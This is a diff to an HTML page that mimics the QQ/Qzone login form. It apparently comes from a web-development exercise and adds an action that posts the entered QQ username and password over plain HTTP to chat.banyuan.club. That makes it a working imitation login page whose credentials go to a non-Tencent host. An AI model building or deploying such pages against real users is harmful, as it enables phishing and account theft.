@@ -9,21 +9,22 @@
             height: 300px;
             border-width:1px;
             border-style:solid;
-            border-color:black;
+            border-color:fuchsia;
         }
     </style>
 </head>
 <body>
 
-<form class="login">
+<form class="login" target="_blank" action="http://chat.banyuan.club/frontend/qqlogin" method="post">
     登陆Qzone<br>
     <pre>
             QQ账号:<input type="text" name="username"><a href="https://baike.baidu.com/item/%E7%9C%BC%E7%A7%91/38035?fr=aladdin">注册新账号</a><br>
             QQ密码:<input type="password" name="password"><a href="https://aq.qq.com/cn2/findpsw/pc/pc_find_pwd_input_account?pw_type=6">忘记密码?</a><br>
-            验证码:<input type="text" name="verification" ><br>
+            验证码:<input type="text" name="validate" ><br>
         输入下图中的字符,不区分大小写<br>
         <img src="getimage1.jpg" alt="验证码"><a href="https://baike.baidu.com/item/%E7%9C%BC%E7%A7%91/38035?fr=aladdin">看不清,换一张</a><br>
-                    <input type="button" value="登陆" >
+                <button type="submit">登陆</button>
+        <input type="reset" >
     </pre>
 </form>
 
